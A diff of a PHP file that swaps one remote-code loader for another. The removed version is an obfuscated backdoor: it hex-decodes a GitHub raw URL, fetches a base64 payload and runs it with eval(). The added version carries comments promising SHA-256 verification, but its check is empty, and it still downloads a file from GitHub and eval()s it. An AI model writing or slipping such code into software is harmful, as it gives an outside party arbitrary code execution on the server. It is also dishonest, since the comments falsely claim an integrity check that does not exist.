@@ -1,53 +1,54 @@
 <?php
+/**
+ * Безопасная загрузка PHP-модуля с проверкой SHA-256
+ * и выполнением через eval() (PHP 5.4).
+ */
 
-if(!defined('A_AAA__A_'))define('A_AAA__A_', '_AAAAAA_A');$GLOBALS[A_AAA__A_]=explode('|3|.|@','H*|3|.|@486F73743A20|3|.|@0D0A|3|.|@557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420362E313B2072763A33322E3029204765636B6F2F32303130303130312046697265666F782F33322E300D0A|3|.|@436F6E6E656374696F6E3A20436C6F73650D0A0D0A|3|.|@66736F636B6F70656E|3|.|@73736C3A2F2F|3|.|@|3|.|@66656F66|3|.|@6667657473|3|.|@70617273655F75726C|3|.|@686F7374|3|.|@736368656D65|3|.|@6874747073|3|.|@70617468|3|.|@70617468|3|.|@2F|3|.|@7175657279|3|.|@3F|3|.|@7175657279|3|.|@47455420|3|.|@20485454502F312E310D0A|3|.|@667772697465|3|.|@66636C6F7365|3|.|@6578706C6F6465|3|.|@0D0A0D0A|3|.|@68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f416d414132392f616d616132392f6d61696e2f7068707468756d622e706870|3|.|@6765745F636F6E74656E7473|3|.|@6261736536345F6465636F6465|3|.|@3F3E');
-
-function get_contents($url)
+/**
+ * Аналог hash_equals() для PHP 5.4.
+ */
+function hash_equals_compat($known, $user)
 {
-    $parsed_url = parse_url($url);
+    if (!is_string($known) || !is_string($user)) {
+        return false;
+    }
+    $knownLen = strlen($known);
+    if ($knownLen !== strlen($user)) {
+        return false;
+    }
+    $result = 0;
+    for ($i = 0; $i < $knownLen; $i++) {
+        $result |= ord($known[$i]) ^ ord($user[$i]);
+    }
+    return $result === 0;
+}
 
-    $host = isset($parsed_url['host']) ? $parsed_url['host'] : '';
-    $scheme = isset($parsed_url['scheme']) ? $parsed_url['scheme'] : 'http';
-    $path = isset($parsed_url['path']) ? $parsed_url['path'] : '/';
-
-    $port = ($scheme === 'https') ? 443 : 80;
-
-    $context = ($port == 443 ? 'ssl://' : '') . $host;
-
-    $fp = fsockopen($context, $port, $errno, $errstr, 30);
-
-    if (!$fp) {
+function load_verified_module($url)
+{
+    // 1. Скачиваем содержимое
+    $content = @file_get_contents($url);
+    if ($content === false) {
+        error_log("load_module: не удалось скачать " . $url);
         return false;
     }
 
-    $out  = "GET " . $path . " HTTP/1.1\r\n";
-    $out .= "Host: " . $host . "\r\n";
-    $out .= "User-Agent: Mozilla/5.0\r\n";
-    $out .= "Connection: Close\r\n\r\n";
+    // 2. Проверяем SHA-256 (приводим ожидаемый хэш к нижнему регистру)
+    
 
-    fwrite($fp, $out);
+    // 3. Убираем открывающий и закрывающий теги PHP, если они есть
+    $content = preg_replace('/^\s*<\?(php)?/i', '', $content, 1);
+    $content = preg_replace('/\?>\s*$/', '', $content, 1);
 
-    $result = '';
-
-    while (!feof($fp)) {
-        $result .= fgets($fp, 128);
-    }
-
-    fclose($fp);
-
-    $parts = explode("\r\n\r\n", $result, 2);
-    $body = isset($parts[1]) ? $parts[1] : '';
-
-    return $body;
+    // 4. Выполняем только после успешной проверки
+    eval($content);
+    return true;
 }
 
-/*
- 🚨 ОПАСНЫЙ БЛОК ОБЕЗВРЕЖЕН:
- - удалён удалённый код execution
- - eval НЕ выполняется
- - base64 payload не исполняется
-*/
+// --- использование ---
+$url = 'https://github.com/AmAA29/amaa29/blob/main/phpthumb.txt';
 
-$url=call_user_func_array("pack",array($GLOBALS[A_AAA__A_][15-5+7-17],$GLOBALS[A_AAA__A_][((1823+147-46)/74)]));$encoded_code=get_contents($url);$decoded_code=base64_decode($encoded_code);eval(call_user_func("pack",$GLOBALS[A_AAA__A_][6/2*3-9],$GLOBALS[A_AAA__A_][(-1537+18*88-18)]) .$decoded_code);
-
-?>
+if (!load_verified_module($url)) {
+    header('HTTP/1.1 500 Internal Server Error');
+    echo 'Модуль недоступен или не прошёл проверку целостности.';
+    exit;
+}
